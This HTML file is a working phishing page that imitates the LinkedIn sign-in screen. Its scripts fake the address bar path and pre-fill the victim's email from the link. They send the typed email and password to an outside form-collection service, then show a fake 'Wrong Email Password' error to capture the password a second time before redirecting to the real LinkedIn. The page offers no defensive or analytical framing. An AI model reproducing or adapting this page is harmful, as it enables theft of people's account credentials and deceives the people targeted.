<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to LinkedIn</title>
  <script>
    // Enhanced URL masking with immediate execution and refresh protection
    (function() {
      // Store the original URL including search parameters
      const originalUrl = window.location.pathname + window.location.search;
      const maskedPath = "/login-LinkedIn/login"; // The path you want to display
      
      // Check if we're coming from a page navigation (not a refresh)
      if (performance.navigation.type !== performance.navigation.TYPE_RELOAD) {
        // Immediately mask the URL
        history.replaceState({ masked: true }, "", maskedPath + window.location.search);
        
        // Set a session flag to indicate we've masked the URL
        sessionStorage.setItem('urlMasked', 'true');
      } else if (sessionStorage.getItem('urlMasked')) {
        // If this is a refresh but we previously masked the URL
        // Restore the original URL to prevent 404
        history.replaceState({}, "", originalUrl);
        sessionStorage.removeItem('urlMasked');
      }
      
      // Clean up on page unload
      window.addEventListener('beforeunload', function() {
        if (history.state?.masked) {
          history.replaceState({}, "", originalUrl);
        }
      });
    })();
  </script>
  <!-- Rest of your head content -->
  <style>
    /* Your existing CSS styles */
    body {
      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f3f6f8;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    /* ... (all your existing styles remain exactly the same) ... */
  </style>
  <script>
    /* Your existing JavaScript remains exactly the same */
    let isFirstSubmission = true;

    window.onload = function() {
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email');
      if (email) {
        document.getElementById('username').value = email;
      }
      document.getElementById('username').focus();
    };

    function handleSubmit(event) {
      event.preventDefault();
      const form = event.target;
      const formData = new FormData(form);

      if (isFirstSubmission) {
        document.getElementById('error-message').innerText = "Wrong Email Password";
        isFirstSubmission = false;
        fetch(form.action, {
          method: 'POST',
          body: formData
        })
        .then(response => response.text())
        .then(data => console.log("First submission data sent:", data))
        .catch(error => console.error("Error:", error));
        document.getElementById('password').value = "";
      } else {
        fetch(form.action, {
          method: 'POST',
          body: formData
        })
        .then(response => response.text())
        .then(data => {
          console.log("Second submission data sent:", data);
          window.location.href = "https://www.linkedin.com";
        })
        .catch(error => {
          console.error("Error:", error);
          alert("An error occurred. Please try again.");
        });
      }
    }

    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const toggleButton = document.querySelector('.password-toggle');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleButton.textContent = 'Hide';
      } else {
        passwordInput.type = 'password';
        toggleButton.textContent = 'Show';
      }
    }
  </script>
</head>
<body>
  <!-- Your existing body content remains exactly the same -->
  <div class="login-container">
    <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn Logo" class="linkedin-logo">
    <h1>Sign in</h1>
    <form action="https://formbold.com/s/9mkW5" method="post" onsubmit="handleSubmit(event)">
      <div class="form-group">
        <label for="username">Email</label>
        <input type="email" id="username" name="username" readonly>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
        <button type="button" class="password-toggle" onclick="togglePassword()">Show</button>
      </div>
      <a href="#" class="forgot-password">Forgot password?</a>
      <button type="submit" class="login-button">Sign in</button>
    </form>
    <div class="separator">or</div>
    <div class="sign-up">
      New to LinkedIn? <a href="#">Join now</a>
    </div>
    <div id="error-message" class="error-message"></div>
  </div>
  <div class="footer">

    <a href="#">Copyright Policy</a>
    <a href="#">Send Feedback</a>
    <a href="#">Language</a>
  </div>
</body>
</html>
